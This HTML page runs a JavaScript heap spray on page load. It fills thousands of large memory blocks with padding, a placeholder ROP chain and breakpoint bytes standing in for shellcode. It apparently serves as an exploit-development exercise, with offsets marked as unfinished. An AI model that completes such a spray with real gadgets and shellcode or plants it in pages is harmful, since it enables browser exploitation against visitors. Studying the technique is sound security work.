<html>
<head>
<script>

var sprayblocks = new Array();

function allocateblocks()
{
	// define payload
	var ropchain = unescape("%u6161%u6161%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565");
	var shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
	
	var beginning = unescape("TEST")
	var junk_start = unescape("%u2020%u2020");
	var junk_end = unescape("%u3030%u3030");
	
	// create large chunk (it's stored in heap, but doesn't matter here). Length doesn't matter.
	while (beginning.length < 0x4000) beginning += junk_start;
	while (junk_end.length < 0x4000) junk_end += junk_end;
	
	// add the padding from block start to our payload (it has to be computed depending on where you jump) 
	offset = 0xBC1; // random for now
	var junk_front = beginning.substring(0, offset);
	
	// construct one block of 0x800 bytes
	var junk_end = junk_end.substring(0, 0x2000 - junk_front.length - ropchain.length - shellcode.length)
	var smallblock = junk_front + ropchain + shellcode + junk_end;

	// repeat a few times 
	var largeblock = "";
	while (largeblock.length < 0x8000) { largeblock = largeblock + smallblock; }

	// allocate 0x5000 times
	for (i = 0; i < 0x5000; i++) { sprayblocks[i] = largeblock.substring(0, ((0x8000-6)/2)-8);	}
	//                                                                           ^
	//                                                                           |
	//     Only changed this                                     ----------------+
}
</script>
</head>

<body onload="allocateblocks()">
</body>
</html>
